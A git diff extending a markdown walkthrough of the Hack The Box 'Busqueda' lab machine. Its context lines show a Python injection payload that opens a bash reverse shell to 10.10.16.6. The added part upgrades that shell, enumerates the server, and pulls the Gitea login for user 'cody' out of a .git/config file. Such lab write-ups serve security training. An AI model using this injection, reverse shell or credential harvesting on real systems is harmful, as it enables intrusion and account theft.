@@ -268,3 +268,90 @@ engine=Google&query=islam')%2b__import__('os').system('id')+%23+
 '),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.16.6/1337 0>&1"')#
 ```
 - run netcat and we got ashell
+- now to upgrade the shell
+```
+svc@busqueda:/root$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+svc@busqueda:/root$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+oxdf@hacky$ stty raw -echo; fg
+nc -lnvp 443
+            reset
+svc@busqueda:/root$ 
+```
+# Privilage Escalation
+- we list direcoty of svc user
+```
+svc@busqueda:~$ ls -la
+total 36
+drwxr-x--- 4 svc  svc  4096 Apr  3 08:58 .
+drwxr-xr-x 3 root root 4096 Dec 22  2022 ..
+lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
+-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
+drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
+-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
+drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
+lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
+-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
+lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
+-rw-r----- 1 root svc    33 Aug 21 22:02 user.txt
+svc@busqueda:~$ 
+```
+- there is a gitconfig
+- we cat it and we see that user svc name is cody
+- The web code is located in /var/www/app we list this directory and find
+```
+svc@busqueda:/var/www/app$ ls -la
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4096 Aug 21 21:58 .git
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+```
+- we see .git
+```
+svc@busqueda:/var/www/app$ cat .git
+cat: .git: Is a directory
+svc@busqueda:/var/www/app$ cd .git
+svc@busqueda:/var/www/app/.git$ ls
+branches        config       HEAD   index  logs     refs
+COMMIT_EDITMSG  description  hooks  info   objects
+svc@busqueda:/var/www/app/.git$ ls -la
+total 52
+drwxr-xr-x 8 www-data www-data 4096 Aug 21 21:58 .
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+svc@busqueda:/var/www/app/.git$ cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+```
+- we see creds heading to gitea.searcher.htb we add it to our etc/hosts
+```
+echo "10.10.11.208 gitea.searcher.htb" | sudo tee -a /etc/hosts
+```
+-cody creds
+```
+cody:jh1usoih2bkjaspwe92
+```
